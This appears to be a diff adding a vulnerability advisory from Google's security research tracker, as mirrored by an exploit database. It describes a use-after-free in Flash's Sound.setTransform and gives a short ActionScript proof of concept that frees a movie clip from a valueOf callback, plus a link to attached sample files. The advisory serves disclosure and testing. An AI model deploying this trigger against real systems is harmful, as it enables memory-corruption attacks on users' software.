@@ -1,0 +1,22 @@
+Source: https://code.google.com/p/google-security-research/issues/detail?id=568
+
+There is a use-after-free in Sound.setTransform. If a transform value is set to an object with valueOf defined, it can free the transform before the values are set. A minimal PoC is as follows:
+
+this.createEmptyMovieClip("my_mc", 1);
+var my_sound:Sound = new Sound("my_mc");
+var o = {valueOf : func};
+my_sound.attachSound("world");
+my_sound.setTransform({ll : o, lr: 0x77777777, rr : 0x77777777, rl : 0x77777777});
+my_sound.start();
+
+function func(){	
+        my_mc.removeMovieClip();
+	return 0x77777777;
+	}
+
+A sample swf and fla are attached. Note that these PoCs will not cause a crash. Instead, they demonstrate the use-after-free by overwriting the matrix array of a ConvolutionFilter. The use-after-free changes the array from being all zeros to having values of float 0x77777777 at the end. The test fails if the second array is not all zero. The test passes if the second array is all zero. These PoCs only work on 64-bit systems.
+
+
+Proof of Concept:
+https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/39072.zip
+
